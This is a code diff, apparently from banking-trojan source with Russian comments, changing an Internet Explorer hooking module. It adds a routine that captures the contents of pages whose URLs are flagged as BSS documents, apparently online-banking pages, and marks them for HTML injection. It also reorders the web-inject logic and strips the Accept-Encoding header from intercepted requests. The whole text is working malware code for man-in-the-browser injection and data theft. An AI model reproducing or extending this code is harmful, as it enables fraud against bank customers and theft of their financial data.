@@ -186,11 +186,22 @@ void FreeIRRequestData(LPVOID Request) {
 
 #ifdef HTMLInjectsH
 
-bool DoInjectIE(PRequest Request) {
-	// Обрабатываем загруженные данные
-	IEDBG(Request, Request->Buffer, "--->> Выполняем HTML инжекты");
+bool DoInjectIE(PRequest Request)
+{
+
+	#ifdef BssSendFileH
+		AddBSSFile(Request->URL, Request->Buffer, Request->BufferSize);
+	#endif
+
 	// Инициализируем информацию о сессии
 	Request->Injected = true;
+
+
+	if (List::Count(Request->Injects) == 0)
+    	return false;
+
+	// Обрабатываем загруженные данные
+	IEDBG(Request, Request->Buffer, "--->> Выполняем HTML инжекты");
 
 	THTTPSessionInfo Session;
 
@@ -200,7 +211,8 @@ bool DoInjectIE(PRequest Request) {
 
 	bool Res = HTMLInjects::Execute(Request, &Session);
 
-	if (Res) {
+	if (Res)
+	{
 		IEDBG(Request, Request->Buffer, "--->> Инжекты успешно выполнены");
 	}
 
@@ -405,12 +417,19 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 
 		pHttpAddRequestHeadersA(Handle, (LPCTSTR)"Accept-Encoding:\n", -1,
 			HTTP_ADDREQ_FLAG_REPLACE);
+
 //		PCHAR Header = "If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT\r\n";
 //		pHttpAddRequestHeadersA(Handle, Header, StrCalcLength(Header), HTTP_ADDREQ_FLAG_REPLACE || HTTP_ADDREQ_FLAG_ADD);
 		// pHttpAddRequestHeadersA(Handle, (LPCTSTR)"TE:\r\n", -1, HTTP_ADDREQ_FLAG_REPLACE );
 	}
 #endif
 	IEDBG(Request, NULL, "Запрос успешно обработан");
+
+
+	#ifdef BssSendFileH
+		if (!Request->IsInject)
+			Request->IsInject = IsBSSDocument(Request->URL);
+	#endif
 
 	// Обрабатываем дополнительные модули
 #ifdef HunterH
